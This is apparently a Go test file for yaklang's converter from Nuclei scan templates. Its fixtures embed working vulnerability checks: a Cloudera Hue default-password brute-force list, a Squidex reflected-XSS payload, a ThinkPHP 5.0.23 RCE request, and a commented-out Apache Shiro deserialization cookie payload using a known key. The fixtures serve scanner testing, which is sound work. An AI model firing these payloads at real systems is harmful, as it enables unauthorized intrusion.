package httptpl

import (
	"fmt"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/davecgh/go-spew/spew"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
)

func TestCreateYakTemplate(t *testing.T) {
	raw := `
id: hue-default-credential

info:
  name: Cloudera Hue Default Admin Login
  author: For3stCo1d
  severity: high
  description: Cloudera Hue default admin credentials were discovered.
  reference:
    - https://github.com/cloudera/hue
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 8
    shodan-query: title:"Hue - Welcome to Hue"
  tags: hue,default-login,oss,cloudera
variables:
  filename: '{{replace(BaseURL,"/","_")}}'
  dir: "screenshots"
http:
  - raw:
      - |
        GET /hue/accounts/login?next=/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /hue/accounts/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        csrfmiddlewaretoken={{csrfmiddlewaretoken}}&username={{user}}&password={{pass}}&next=%2F

  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/sucuri-scanner/readme.txt"

    attack: pitchfork
    payloads:
      user:
        - admin
        - hue
        - hadoop
        - cloudera
      pass:
        - admin
        - hue
        - hadoop
        - cloudera
    cookie-reuse: true

    extractors:
      - type: regex
        name: csrfmiddlewaretoken
        part: body
        internal: true
        group: 1
        regex:
          - name='csrfmiddlewaretoken' value='(.+?)'
    req-condition: true
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - contains(tolower(body_1), 'welcome to hue')
          - contains(tolower(header_2), 'csrftoken=')
          - contains(tolower(header_2), 'sessionid=')
        condition: and

      - type: status
        status:
          - 302
`
	tmp, err := CreateYakTemplateFromNucleiTemplateRaw(raw)
	if err != nil {
		t.Fatal(err)
	}
	assert.Equal(t, 2, len(tmp.HTTPRequestSequences), "parse HTTPRequestSequences error")
	assert.Equal(t, 2, len(tmp.HTTPRequestSequences[0].HTTPRequests), "parse HTTPRequests error")
	assert.Equal(t, 1, len(tmp.HTTPRequestSequences[1].Paths), "parse HTTPRequests error")
	assert.Equal(t, "GET", tmp.HTTPRequestSequences[1].Method, "parse HTTPRequests error")
	filenameVar, ok := tmp.Variables.Get("filename")
	assert.True(t, ok, "parse variables[filename] error")
	assert.Equal(t, "{{replace(BaseURL,\"/\",\"_\")}}", filenameVar.Data, "parse variables[filename] error")
	dirVar, ok := tmp.Variables.Get("dir")
	assert.True(t, ok, "parse variables[dir] error")
	assert.Equal(t, "screenshots", dirVar.Data, "parse variables[dir] error")
	// matchers
	matchers := tmp.HTTPRequestSequences[1].Matcher
	assert.NotNil(t, matchers)
	assert.NotEqual(t, "", matchers.TemplateName)
	assert.Len(t, matchers.SubMatchers, 2)
	// matcher 1
	matcher1 := matchers.SubMatchers[0]
	assert.Equal(t, "expr", matcher1.MatcherType)
	assert.Equal(t, "nuclei-dsl", matcher1.ExprType)
	assert.Equal(t, "raw", matcher1.Scope)
	assert.Equal(t, []string{
		"contains(tolower(body_1), 'welcome to hue')",
		"contains(tolower(header_2), 'csrftoken=')",
		"contains(tolower(header_2), 'sessionid=')",
	}, matcher1.Group)
	// matcher 2
	matcher2 := matchers.SubMatchers[1]
	assert.Equal(t, "status_code", matcher2.MatcherType)
	assert.Equal(t, "raw", matcher2.Scope)
	assert.Equal(t, []string{"302"}, matcher2.Group)
	// extractors
	extractors := tmp.HTTPRequestSequences[1].Extractor
	assert.Len(t, extractors, 1)
	// extractor 1
	extractor1 := extractors[0]
	assert.Equal(t, "csrfmiddlewaretoken", extractor1.Name)
	assert.Equal(t, "body", extractor1.Scope)
	assert.Equal(t, "regex", extractor1.Type)
	assert.Equal(t, []string{
		"name='csrfmiddlewaretoken' value='(.+?)'",
	}, extractor1.Groups)
	assert.Equal(t, []int{
		1,
	}, extractor1.RegexpMatchGroup)
}

func TestCreateYakTemplateFromSelfContained(t *testing.T) {
	demo := `
id: self-contained-file-input

info:
  name: Test Self Contained Template With File Input
  author: pdteam
  severity: info

self-contained: true
requests:
  - method: GET
    path:
      - "http://127.0.0.1:5431/{{test}}"
    matchers:
      - type: word
        words:
          - This is self-contained response
      
  - raw:
      - |
        GET http://127.0.0.1:5431/{{test}} HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        words:
          - This is self-contained response
`
	data, err := CreateYakTemplateFromNucleiTemplateRaw(demo)
	if err != nil {
		t.Fatal(err)
	}
	if !data.SelfContained {
		t.Fatal("self-contained failed")
	}
	config := NewConfig()

	n, err := data.ExecWithUrl("http://www.baidu.com", config)
	if err != nil {
		t.Fatal(err)
	}
	if n != 0 {
		t.Fatal("self-contained failed")
	}
}

func TestCreateYakTemplateFromNucleiTemplateRaw(t *testing.T) {
	server, port := utils.DebugMockHTTP([]byte("HTTP/1.1 200 OK\r\n" +
		"Content-Length: 111\r\n" +
		"Server: nginx\r\n\r\n"))
	demo := `id: CVE-2023-24278

info:
  name: Squidex <7.4.0 - Cross-Site Scripting
  author: r3Y3r53
  severity: medium
  description: |
    Squidex before 7.4.0 contains a cross-site scripting vulnerability via the squid.svg endpoint. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
  reference:
    - https://census-labs.com/news/2023/03/16/reflected-xss-vulnerabilities-in-squidex-squidsvg-endpoint/
    - https://www.openwall.com/lists/oss-security/2023/03/16/1
    - https://nvd.nist.gov/vuln/detail/CVE-2023-24278
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-24278
    cwe-id: CWE-79
  metadata:
    shodan-query: http.favicon.hash:1099097618
    verified: "true"
  tags: cve,cve2023,xss,squidex,cms,unauth

variables:
  a1: "{{rand_int(1000,9000)}}"
  a2: "{{rand_int(1000,9000)}}"
  a3: "{{rand_int(1000,9000)}}{{a1}}"
  a4: "{{rand_int(1000,9000)}}{{a2}}------{{a1+a2}}=={{a1}}+{{a2}}  {{to_number(a1)*to_number(a2)}}=={{a1}}*{{a2}}"
  a5: "{{randstr}}"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/squid.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
      - "{{BaseURL}}/squi{{a4}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
      - "{{BaseURL}}/squi{{md5(a4)}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
      - "{{BaseURL}}/squi{{md5(a4)}}{{a1}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
    headers:
      Authorization: "{{a1+a3}} {{a2}} {{BaseURL}}"
      Test-Payload: "{{name}} {{a6}}"

    payloads:
      name:
        - "admin123"
        - "aaa123"
      a6:
        - "321nimda"
        - 321aaa

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"
          - "looking for!"
          - "{{md5(a4)}}"
        condition: or

      - type: word
        part: header
        words:
          - "image/svg+xml"

      - type: status
        status:
          - 200

# Enhanced by md on 2023/04/14`
	data, err := CreateYakTemplateFromNucleiTemplateRaw(demo)
	require.NoError(t, err)
	if data.Id != "" {
		t.Logf("id: %v", data.Id)
	}

	require.Greater(t, len(data.HTTPRequestSequences), 0, "no request sequence")

	require.NotNil(t, data.HTTPRequestSequences[0].Matcher, "no matcher")
	require.NotNil(t, data.Variables, "variable failed")
	vairablesKey := data.Variables.Keys()
	require.Len(t, vairablesKey, 5)
	require.Equal(t, []string{"a1", "a2", "a3", "a4", "a5"}, vairablesKey)

	n, err := data.Exec(nil, false, []byte("GET /bai/path HTTP/1.1\r\n"+
		"Host: www.baidu.com\r\n\r\n"), lowhttp.WithHost(server), lowhttp.WithPort(port))
	require.NoError(t, err)
	require.Equal(t, 16, n)
}

func TestCreateYakTemplateFromNucleiTemplateRaw_AttachSYNC(t *testing.T) {
	demo := `
id: mocked

info:
  name: ThinkPHP 5.0.23 - Remote Code Execution
  author: dr_set
  severity: critical
  description: ThinkPHP 5.0.23 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5.0.23-rce
  tags: thinkphp,rce
  metadata:
    max-request: 1

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?s=captcha&c=Inotify&function=hello&u=123"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Extension"
          - "PHP Version"
          - "ThinkPHP"
        condition: and

      - type: status
        status:
          - 200`
	data, err := CreateYakTemplateFromNucleiTemplateRaw(demo)
	if err != nil {
		panic(err)
	}

	if data.Id != "" {
		t.Logf("id: %v", data.Id)
	}

	if len(data.HTTPRequestSequences) == 0 {
		panic("no request sequence")
	}

	if data.HTTPRequestSequences[0].Matcher == nil {
		panic("no matcher")
	}

	if data.Variables == nil {
		panic("variable failed!")
	}

	if ret := data.Variables.ToMap(); len(ret) != 0 {
		spew.Dump(ret)
		panic(fmt.Sprintf("variables length error: %v(got) != 0(want)", len(ret)))
	} else {
		spew.Dump(ret)
	}

	server, port := utils.DebugMockHTTP([]byte("HTTP/1.1 200 OK\r\n" +
		"Content-Length: 111\r\n" +
		"Server: nginx\r\n\r\n"))

	n, err := data.Exec(nil, false, []byte("GET /bai/path HTTP/1.1\r\n"+
		"Host: www.baidu.com\r\n\r\n"), lowhttp.WithHost(server), lowhttp.WithPort(port))
	if err != nil {
		panic(err)
	}
	if n != 1 {
		panic(fmt.Sprintf("nuclei exec failed: %v(got) != 1(want)", n))
	}
	log.Infof("found N: %v", n)
}

// CVE-2016-3347
// func TestCreateYakTemplateFromNucleiTemplateRaw2(t *testing.T) {
// 	demo := `
// id: CVE-2016-4437
// info:
//   name: Apache Shiro 1.2.4 Cookie RememberME - Deserial Remote Code Execution Vulnerability
//   author: iamnoooob,rootxharsh,pdresearch
//   severity: high
//   description: |
//     Apache Shiro before 1.2.5, when a cipher key has not been configured for the "remember me" feature, allows remote attackers to execute arbitrary code or bypass intended access restrictions via an unspecified request parameter.
//   reference:
//     - https://github.com/Medicean/VulApps/tree/master/s/shiro/1
//     - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4437
//     - http://packetstormsecurity.com/files/137310/Apache-Shiro-1.2.4-Information-Disclosure.html
//     - http://packetstormsecurity.com/files/157497/Apache-Shiro-1.2.4-Remote-Code-Execution.html
//     - http://rhn.redhat.com/errata/RHSA-2016-2035.html
//   classification:
//     cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
//     cvss-score: 8.1
//     cve-id: CVE-2016-4437
//     cwe-id: CWE-284
//     epss-score: 0.97483
//     cpe: cpe:2.3:a:apache:shiro:*:*:*:*:*:*:*:*
//   metadata:
//     max-request: 1
//     vendor: apache
//     product: shiro
//   tags: cve,apache,rce,kev,packetstorm,cve2016,shiro,deserialization,oast

// http:
//   - raw:
//       - |
//         GET / HTTP/1.1
//         Host: {{Hostname}}
//         Content-Type: application/x-www-form-urlencoded
//         Cookie: rememberMe={{base64(concat(base64_decode("QUVTL0NCQy9QS0NTNVBhZA=="),aes_cbc(base64_decode(generate_java_gadget("dns", "http://{{interactsh-url}}", "base64")), base64_decode("kPH+bIxk5D2deZiIxcaaaA=="), base64_decode("QUVTL0NCQy9QS0NTNVBhZA=="))))}}

//     matchers:
//       - type: word
//         part: interactsh_protocol
//         words:
//           - dns`
// 	demo = strings.TrimSpace(demo)

// 	ch, err := ScanLegacy("192.168.3.113:8086", WithEnableReverseConnectionFeature(true), WithTemplateRaw(string(demo)), WithDebug(true), WithDebugRequest(true), WithDebugResponse(true))
// 	if err != nil {
// 		t.Fatal(err)
// 	}
// 	for {
// 		select {
// 		case v := <-ch:
// 			if v == nil {
// 				t.Fatal("poc is nil")
// 			}
// 			t.Logf("found poc: %v", v)
// 			return
// 		case <-time.After(time.Second * 10):
// 			t.Fatal("timeout")
// 		}
// 	}
// }

func TestNucleiScanWithCustomVars(t *testing.T) {
	rawTpl := `
id: custom-vars-test
info:
  name: custom vars
  severity: info
http:
  - method: GET
    path:
      - /
    matchers:
      - type: dsl
        dsl:
          - custom_flag == "ALLOW"
`

	tpl, err := CreateYakTemplateFromNucleiTemplateRaw(rawTpl)
	require.NoError(t, err)

	config := NewConfig(WithCustomVariables(map[string]any{"custom_flag": "ALLOW"}))
	applyCustomVariablesToTemplate(tpl, config)
	require.NotNil(t, tpl.Variables)

	runtimeVars := tpl.Variables.ToMap()
	resp := &RespForMatch{
		RawPacket: []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"),
	}
	match, err := tpl.HTTPRequestSequences[0].Matcher.Execute(resp, runtimeVars)
	require.NoError(t, err)
	require.True(t, match, "expected matcher to see injected variable")
}
